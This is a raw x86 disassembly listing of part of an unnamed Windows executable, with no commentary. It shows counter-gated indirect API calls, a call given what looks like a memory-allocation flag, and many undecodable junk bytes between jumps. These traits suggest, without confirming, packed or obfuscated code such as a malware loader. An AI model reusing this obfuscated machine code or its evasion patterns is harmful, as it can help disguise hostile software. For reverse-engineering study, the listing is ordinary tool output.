  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x55]
  40b0b6:	sbb    BYTE PTR [ecx+0x7e3fc9fb],bh
  40b0bc:	jle    0x40b074
  40b0be:	jle    0x40b13e
  40b0c0:	jle    0x40b09f
  40b0c2:	not    DWORD PTR [edx+ebp*8-0x3f04cee8]
  40b0c9:	jmp    0x40b072
  40b0cb:	push   ebx
  40b0cc:	mov    cl,0x6f
  40b0ce:	mov    eax,ds:0x25289fe5
  40b0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d4:	add    dl,dl
  40b0d6:	inc    esp
  40b0d7:	jle    0x40b0a7
  40b0d9:	adc    DWORD PTR [eax-0x4a],0xffffffa5
  40b0dd:	xchg   edx,eax
  40b0de:	retf   
  40b0df:	pop    edx
  40b0e0:	stos   BYTE PTR es:[edi],al
  40b0e1:	sbb    BYTE PTR [ecx-0x59018ab3],dl
  40b0e7:	cmp    edx,DWORD PTR [ecx+0x56]
  40b0ea:	out    dx,eax
  40b0eb:	daa    
  40b0ec:	add    BYTE PTR [ecx-0x10],al
  40b0ef:	mov    esp,0x4deaef43
  40b0f4:	loope  0x40b122
  40b0f6:	mov    BYTE PTR [ecx-0x33],ch
  40b0f9:	push   edx
  40b0fa:	loopne 0x40b089
  40b0fc:	inc    edi
  40b0fd:	push   eax
  40b0fe:	sub    esp,ebx
  40b100:	fst    st(6)
  40b102:	sub    ebx,DWORD PTR [edx+0x1d]
  40b105:	jmp    FWORD PTR [edx+0x422518a4]
  40b10b:	xor    eax,0x197591ee
  40b110:	nop
  40b111:	pop    edx
  40b112:	inc    esi
  40b113:	mov    dh,0x3f
  40b115:	sar    BYTE PTR [esi-0x3a],cl
  40b118:	outs   dx,BYTE PTR ds:[esi]
  40b119:	mov    esi,0xa3410b3
  40b11e:	pop    edx
  40b11f:	push   edi
  40b120:	sbb    DWORD PTR [edx],ecx
  40b122:	and    ah,dl
  40b124:	jbe    0x40b1a3
  40b126:	iret   
  40b127:	mov    al,0xf9
  40b129:	loop   0x40b0e3
  40b12b:	idiv   edi
  40b12d:	stos   DWORD PTR es:[edi],eax
  40b12e:	mov    al,0x95
  40b130:	imul   ebx,DWORD PTR [edi-0x76],0xdc38845f
  40b137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b138:	mov    bh,0xec
  40b13a:	outs   dx,BYTE PTR ds:[esi]
  40b13b:	or     eax,esp
  40b13d:	xchg   ebp,eax
  40b13e:	jl     0x40b101
  40b140:	div    BYTE PTR [ebx-0x50ba7e23]
  40b146:	inc    ecx
  40b147:	ss jecxz 0x40b112
  40b14a:	mov    esp,0xa35023b8
  40b14f:	pop    ebx
  40b150:	inc    DWORD PTR [esi+0x54]
  40b153:	dec    ecx
  40b154:	sbb    al,0x54
  40b156:	dec    edx
  40b157:	rcl    DWORD PTR [edx+0x1d064db7],1
  40b15d:	scas   al,BYTE PTR es:[edi]
  40b15e:	(bad)  
  40b15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b160:	cmp    DWORD PTR [ebp+0x3eb854fd],esi
  40b166:	bound  eax,QWORD PTR [eax-0x5dbde386]
  40b16c:	dec    edx
  40b16d:	shl    dh,cl
  40b16f:	in     eax,0x41
  40b171:	jl     0x40b18f
  40b173:	cli    
  40b174:	add    al,0xb7
  40b176:	inc    ebx
  40b177:	std    
  40b178:	sub    al,0x2c
  40b17a:	sbb    BYTE PTR [eax+0x56],al
  40b17d:	loop   0x40b17d
  40b17f:	repz std 
  40b181:	jmp    0x4d04cde8
  40b186:	mov    dl,0xa5
  40b188:	and    DWORD PTR [ecx-0x49f0078b],ecx
  40b18e:	or     eax,0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x4a
  40b1ab:	das    
  40b1ac:	xor    al,0xa9
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b1a3
  40b1b7:	or     ebp,0x79c9a22e
  40b1bd:	aaa    
  40b1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bf:	xchg   DWORD PTR [esi+esi*2+0x2d],ebp
  40b1c3:	xchg   ebx,eax
  40b1c4:	mov    cl,0x97
  40b1c6:	mov    ah,0xde
  40b1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c9:	add    ah,BYTE PTR [ebx+0x234cae8b]
  40b1cf:	fisubr WORD PTR [ebx-0x6f]
  40b1d2:	aaa    
  40b1d3:	in     eax,0x3d
  40b1d5:	aam    0xc9
  40b1d7:	pop    ds
  40b1d8:	test   DWORD PTR ds:0x1e39e11b,0xa5460c0e
  40b1e2:	mov    eax,ds:0x55cc0c3b
  40b1e7:	jno    0x40b19c
  40b1e9:	cmp    ah,BYTE PTR [edx+0x7b]
  40b1ec:	pop    edx
  40b1ed:	mov    eax,ds:0x6c4322c9
  40b1f2:	or     eax,0xbc339b1b
  40b1f7:	fdivr  st(5),st
  40b1f9:	dec    ebp
  40b1fa:	outs   dx,BYTE PTR ds:[esi]
  40b1fb:	and    edi,eax
  40b1fd:	sub    DWORD PTR [edx-0x58a6a4ff],0xbd254f70
  40b207:	sub    DWORD PTR [eax+0x56],0xb520486
  40b20e:	inc    eax
  40b20f:	mov    ebp,0x60b08dc3
  40b214:	inc    ebx
  40b215:	push   ds
  40b216:	cwde   
  40b217:	mov    eax,ds:0x96da1119
  40b21c:	or     al,0xbe
  40b21e:	clc    
  40b21f:	xchg   BYTE PTR [edx-0x5fbd8581],ah
  40b225:	imul   ebx,esi,0xffffffcf
  40b228:	aam    0x78
  40b22a:	fwait
  40b22b:	mov    dh,0x9d
  40b22d:	inc    ebx
  40b22e:	daa    
  40b22f:	arpl   WORD PTR [edx-0x4fefd87b],cx
  40b235:	cdq    
  40b236:	sub    eax,0x4f047f45
  40b23b:	or     BYTE PTR [ebx+0x44],ah
  40b23e:	push   ss
  40b23f:	pop    esi
  40b240:	ss jge 0x40b2a1
  40b243:	mov    ebx,DWORD PTR [esi-0x4e]
  40b246:	mov    eax,ds:0xcf0818d9
  40b24b:	jle    0x40b1de
  40b24d:	lahf   
  40b24e:	(bad)  
  40b24f:	xor    ecx,DWORD PTR [ebp+0x44]
  40b252:	jns    0x40b2cd
  40b254:	jne    0x40b2bd
  40b256:	pop    ss
  40b257:	ret    
  40b258:	scas   al,BYTE PTR es:[edi]
  40b259:	mov    esi,0xe413de21
  40b25e:	(bad)  
  40b25f:	fstp   QWORD PTR [esp+ebp*4-0x38]
  40b263:	mov    eax,0x8cfccf40
  40b268:	xchg   esi,eax
  40b269:	addr16 push ecx
  40b26b:	mov    dl,0x2d
  40b26d:	mov    BYTE PTR [edi+0x11],cl
  40b270:	add    ch,al
  40b272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b273:	rcl    BYTE PTR [eax-0x59],0x4d
  40b277:	mov    ebp,0xcd080752
  40b27c:	mov    al,ds:0xe84d8b19
  40b281:	sub    DWORD PTR ds:0x4150fd,0x41abda
  40b28b:	xor    ecx,eax
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0x619a5cd],edx
  40b2e2:	cs mov al,0x78
  40b2e5:	pop    ecx
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b330
  40b2ee:	pop    ecx
  40b2ef:	or     eax,0x50f2a350
  40b2f4:	ficom  WORD PTR [esi+0x71]
  40b2f7:	or     al,BYTE PTR [edi]
  40b2f9:	sub    eax,eax
  40b2fb:	outs   dx,BYTE PTR ds:[esi]
  40b2fc:	in     eax,dx
  40b2fd:	jle    0x40b2fa
  40b2ff:	retf   
  40b300:	fcomi  st,st(4)
  40b302:	(bad)  
  40b303:	jo     0x40b34e
  40b305:	push   esi
  40b306:	mov    dl,0x16
  40b308:	xor    DWORD PTR [esi],0xffffff96
  40b30b:	into   
  40b30c:	push   ss
  40b30d:	pop    esi
  40b30e:	xor    BYTE PTR [ebx],bh
  40b310:	stos   BYTE PTR es:[edi],al
  40b311:	sar    DWORD PTR [edx+0x529829ce],1
  40b317:	not    BYTE PTR [ebx-0x5b9f515e]
  40b31d:	popf   
  40b31e:	ss ret 
  40b320:	mov    BYTE PTR [esi],dl
  40b322:	stos   DWORD PTR es:[edi],eax
  40b323:	pcmpeqw mm3,QWORD PTR [ebx+0xb145fcc]
  40b32a:	pushf  
  40b32b:	mov    bl,0x11
  40b32d:	pop    ss
  40b32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b32f:	pusha  
  40b330:	inc    esi
  40b331:	rcl    BYTE PTR [edi+0x77159043],cl
  40b337:	in     eax,dx
  40b338:	mov    ebx,0x572299d8
  40b33d:	dec    edi
  40b33e:	adc    edi,DWORD PTR [esi+0x4c]
  40b341:	push   ebp
  40b342:	push   ss
  40b343:	inc    edi
  40b344:	dec    edx
  40b345:	test   cl,ch
  40b347:	aam    0x53
  40b349:	pop    esp
  40b34a:	addr16 add al,0xd
  40b34d:	in     al,0xb4
  40b34f:	scas   al,BYTE PTR es:[edi]
  40b350:	cs pop edx
  40b352:	jmp    0x40b30b
  40b354:	sbb    DWORD PTR [esi+0x550b5211],esi
  40b35a:	(bad)  
  40b35b:	js     0x40b3aa
  40b35d:	jg     0x40b3d1
  40b35f:	add    ebp,edi
  40b361:	adc    WORD PTR es:[eax-0x5d1c85fe],bp
  40b369:	xchg   ecx,eax
  40b36a:	sar    ebx,0x10
  40b36d:	addr16 gs in al,dx
  40b370:	lods   al,BYTE PTR ds:[esi]
  40b371:	pushf  
  40b372:	addr16 gs dec ecx
  40b375:	arpl   WORD PTR [ebx-0x24],dx
  40b378:	add    al,0x8
  40b37a:	loope  0x40b3c7
  40b37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b37d:	rcr    DWORD PTR ds:[esi-0x5b4430b6],1
  40b384:	jb     0x40b3a9
  40b386:	jb     0x40b364
  40b388:	and    eax,0x6465263b
  40b38d:	rcl    DWORD PTR [edi+0x602e4f16],cl
  40b393:	daa    
  40b394:	add    al,0xc4
  40b396:	inc    esp
  40b397:	adc    eax,0x714f003
  40b39c:	or     ebp,DWORD PTR [eax+0x3e07a420]
  40b3a2:	jno    0x40b3f6
  40b3a4:	scas   al,BYTE PTR es:[edi]
  40b3a5:	dec    esp
  40b3a6:	pop    ecx
  40b3a7:	or     eax,0x8e741441
  40b3ac:	sub    dh,BYTE PTR [ecx+edi*8+0x51528bbb]
  40b3b3:	dec    ebp
  40b3b4:	pop    ebx
  40b3b5:	jne    0x40b94a
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	dec    ebp
  40b53a:	jne    0x40b560
  40b53c:	inc    ecx
  40b53d:	xchg   ecx,eax
  40b53e:	cmp    eax,0x7eb67e7e
  40b543:	jle    0x40b5c3
  40b545:	pop    ds
  40b546:	das    
  40b547:	shl    DWORD PTR [edx+0x6970b05a],0x1a
  40b54e:	sbb    al,0xe7
  40b550:	mov    bl,0x9c
  40b552:	mov    dl,0xda
  40b554:	mov    BYTE PTR ds:0x6e80ee76,cl
  40b55a:	aad    0x67
  40b55c:	sub    DWORD PTR [ebx+0x0],eax
  40b55f:	pop    ds
  40b560:	stc    
  40b561:	mov    BYTE PTR [ebx],ch
  40b563:	adc    BYTE PTR [ecx-0x3],ah
  40b566:	scas   eax,DWORD PTR es:[edi]
  40b567:	je     0x40b506
  40b569:	mov    ?,WORD PTR [esi+0x69]
  40b56c:	out    dx,al
  40b56d:	jne    0x40b554
  40b56f:	or     al,0xbc
  40b571:	loope  0x40b520
  40b573:	call   0x9f10:0x25683cb4
  40b57a:	mov    edi,DWORD PTR [ebx+0x44]
  40b57d:	js     0x40b511
  40b57f:	dec    ecx
  40b580:	sar    ch,1
  40b582:	sub    al,0x67
  40b584:	ins    BYTE PTR es:[edi],dx
  40b585:	or     eax,0x464c9b0b
  40b58a:	fild   WORD PTR [ebx+0x36]
  40b58d:	xchg   ecx,eax
  40b58e:	out    0xfe,al
  40b590:	jns    0x40b5b3
  40b592:	es popa 
  40b594:	call   0x62de6e78
  40b599:	shrd   ecx,esi,0x84
  40b59d:	call   0x817e41ee
  40b5a2:	loop   0x40b620
  40b5a4:	adc    cl,BYTE PTR [edi]
  40b5a6:	ror    DWORD PTR [eax],cl
  40b5a8:	mov    ecx,0x1e449947
  40b5ad:	(bad)  [eax]
  40b5af:	call   DWORD PTR [ebp-0x54]
  40b5b2:	loopne 0x40b53c
  40b5b4:	je     0x40b618
  40b5b6:	and    DWORD PTR [ecx-0x5b],edx
  40b5b9:	dec    ebp
  40b5ba:	jg     0x40b5b4
  40b5bc:	jno    0x40b59d
  40b5be:	inc    edx
  40b5bf:	ins    DWORD PTR es:[edi],dx
  40b5c0:	mov    ds:0x2b6842fa,al
  40b5c5:	lods   eax,DWORD PTR ds:[esi]
  40b5c6:	std    
  40b5c7:	setb   BYTE PTR [edi+0x142b82d]
  40b5ce:	stc    
  40b5cf:	pop    ds
  40b5d0:	or     DWORD PTR [edx+0x4c],edx
  40b5d3:	ds mov edx,ss
  40b5d6:	xlat   BYTE PTR ds:[ebx]
  40b5d7:	in     al,0xbd
  40b5d9:	sbb    esi,DWORD PTR [edi-0x4b74126]
  40b5df:	sbb    dh,BYTE PTR [edx]
  40b5e1:	aam    0x43
  40b5e3:	lock mov cl,0x7f
  40b5e6:	(bad)  
  40b5e7:	mov    dh,0x2f
  40b5e9:	ja     0x40b62c
  40b5eb:	push   ebp
  40b5ec:	or     ecx,edx
  40b5ee:	pop    ebx
  40b5ef:	push   ecx
  40b5f0:	stc    
  40b5f1:	out    0xd0,eax
  40b5f3:	mov    ecx,DWORD PTR [ebx+0x2de74df0]
  40b5f9:	les    ebp,FWORD PTR gs:[eax-0x58]
  40b5fd:	aad    0x92
  40b5ff:	fucomi st,st(4)
  40b601:	out    dx,eax
  40b602:	jne    0x40b5f4
  40b604:	stos   BYTE PTR es:[edi],al
  40b605:	xchg   edx,eax
  40b606:	jecxz  0x40b5fc
  40b608:	(bad)  
  40b609:	lods   eax,DWORD PTR ds:[esi]
  40b60a:	adc    bl,BYTE PTR [edx+0x42840fa8]
  40b610:	add    eax,0x1d810000
  40b615:	adc    eax,0x68004151
  40b61a:	and    eax,DWORD PTR [ecx+0x0]
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0xab,al
  40b632:	neg    BYTE PTR [edx]
  40b634:	adc    ch,cl
  40b636:	xor    bh,BYTE PTR [esi+0x7e]
  40b639:	mov    dh,0x7e
  40b63b:	jle    0x40b6bb
  40b63d:	ins    BYTE PTR es:[edi],dx
  40b63e:	cdq    
  40b63f:	nop
  40b640:	call   0xb5b9:0xa34c7095
  40b647:	push   0xffffffce
  40b649:	jle    0x40b681
  40b64b:	retf   0x3e1
  40b64e:	jbe    0x40b644
  40b650:	push   ss
  40b651:	sbb    bh,ah
  40b653:	inc    edi
  40b654:	mov    ch,BYTE PTR [ebp+0x25e34eb9]
  40b65a:	add    DWORD PTR [ecx+0x74],ebp
  40b65d:	dec    ebx
  40b65e:	xchg   esp,eax
  40b65f:	ds or  ecx,edx
  40b662:	sub    BYTE PTR [edi-0x31],dl
  40b665:	dec    esi
  40b666:	dec    edi
  40b667:	outs   dx,BYTE PTR ds:[esi]
  40b668:	mov    WORD PTR [esi],ds
  40b66a:	xor    bl,ch
  40b66c:	jne    0x40b676
  40b66e:	xchg   edi,eax
  40b66f:	and    BYTE PTR [ebx],dh
  40b671:	(bad)  
  40b672:	cmp    edi,edx
  40b674:	or     cl,BYTE PTR [ecx+0x1c]
  40b677:	mov    dl,0xaf
  40b679:	push   esi
  40b67a:	addr16 sub eax,0x9587adb
  40b680:	data16 fldcw WORD PTR [esi+0x2f]
  40b684:	xchg   ebp,eax
  40b685:	xor    eax,0xdeacd104
  40b68a:	repz fidivr WORD PTR [ecx+0x2f]
  40b68e:	push   ebp
  40b68f:	jne    0x40b672
  40b691:	mov    ch,0xa5
  40b693:	and    dl,BYTE PTR [eax+0x1a742b40]
  40b699:	inc    ebx
  40b69a:	push   ds
  40b69b:	addr16 gs mov eax,0xfd352205
  40b6a2:	mov    edx,0x78a92241
  40b6a7:	or     eax,0x70e12a7a
  40b6ac:	ins    BYTE PTR es:[edi],dx
  40b6ad:	iret   
  40b6ae:	lods   al,BYTE PTR ds:[esi]
  40b6af:	lods   al,BYTE PTR ds:[esi]
  40b6b0:	das    
  40b6b1:	jle    0x40b646
  40b6b3:	inc    DWORD PTR [eax]
  40b6b5:	fmul   QWORD PTR [eax]
  40b6b7:	dec    esp
  40b6b8:	adc    eax,DWORD PTR [ecx+0x71]
  40b6bb:	xor    DWORD PTR [ecx],edi
  40b6bd:	and    dh,al
  40b6bf:	push   esi
  40b6c0:	and    bh,BYTE PTR [ebx+esi*2+0x55b79a01]
  40b6c7:	mov    BYTE PTR [ebx],ah
  40b6c9:	sbb    BYTE PTR [ecx+0x4d],bh
  40b6cc:	xchg   edx,eax
  40b6cd:	ins    DWORD PTR es:[edi],dx
  40b6ce:	hlt    
  40b6cf:	sbb    bl,cl
  40b6d1:	inc    esp
  40b6d2:	and    BYTE PTR [ebp-0x1e],bl
  40b6d5:	fst    DWORD PTR [edx+0x27]
  40b6d8:	pop    ecx
  40b6d9:	xchg   ecx,eax
  40b6da:	shl    BYTE PTR [ebx],cl
  40b6dc:	push   ebx
  40b6dd:	lock mov ebx,DWORD PTR [ebx-0x2836ce74]
  40b6e4:	mov    ecx,0x94c86735
  40b6e9:	xchg   edx,eax
  40b6ea:	adc    al,0xc3
  40b6ec:	(bad)  
  40b6ed:	(bad)  
  40b6ef:	add    bl,BYTE PTR [ebp+0x1d]
  40b6f2:	and    edx,0xffffffab
  40b6f5:	je     0x40b763
  40b6f7:	rol    DWORD PTR [ebx+0x7e50d8ec],1
  40b6fd:	add    BYTE PTR [ebp-0x7],0xfb
  40b701:	pop    edi
  40b702:	pop    eax
  40b703:	ins    DWORD PTR es:[edi],dx
  40b704:	mov    dh,0xff
  40b706:	jne    0x40b710
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xc5ab23e6
  40b867:	push   cs
  40b868:	and    DWORD PTR cs:[ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	jle    0x40b7f9
  40b873:	sbb    al,0xa9
  40b875:	(bad)  [edx]
  40b877:	cbw    
  40b879:	sub    BYTE PTR [ecx-0x15bf8928],0xa5
  40b880:	(bad)  
  40b881:	fmul   DWORD PTR [edx]
  40b883:	sub    DWORD PTR [eax-0x33733c34],ecx
  40b889:	pop    ebp
  40b88a:	fidivr WORD PTR [eax]
  40b88c:	xchg   ebp,eax
  40b88d:	jge    0x40b856
  40b88f:	(bad)  
  40b890:	rcr    cl,0x6c
  40b893:	mov    ecx,0x147f9de1
  40b898:	or     BYTE PTR [ebp-0x584b612a],0x78
  40b89f:	out    0x12,al
  40b8a1:	fild   DWORD PTR [esi-0x4e5fd96c]
  40b8a7:	test   al,0x2a
  40b8a9:	cs xchg ebx,eax
  40b8ab:	inc    ecx
  40b8ac:	imul   ebp,esi,0x48f1c421
  40b8b2:	pop    esp
  40b8b3:	jae    0x40b924
  40b8b5:	hlt    
  40b8b6:	sahf   
  40b8b7:	adc    esp,ebp
  40b8b9:	repz or eax,0x556089ce
  40b8bf:	daa    
  40b8c0:	dec    edx
  40b8c1:	xchg   edx,eax
  40b8c2:	sbb    esp,esp
  40b8c4:	in     al,dx
  40b8c5:	dec    edx
  40b8c6:	xchg   BYTE PTR [edi+esi*4+0x7a],cl
  40b8ca:	lods   eax,DWORD PTR ds:[esi]
  40b8cb:	rcr    BYTE PTR [eax-0x62d86f4a],1
  40b8d1:	aad    0x7d
  40b8d3:	xor    al,0x2d
  40b8d5:	xchg   edi,eax
  40b8d6:	and    dl,al
  40b8d8:	shr    dh,0x47
  40b8db:	or     al,0x0
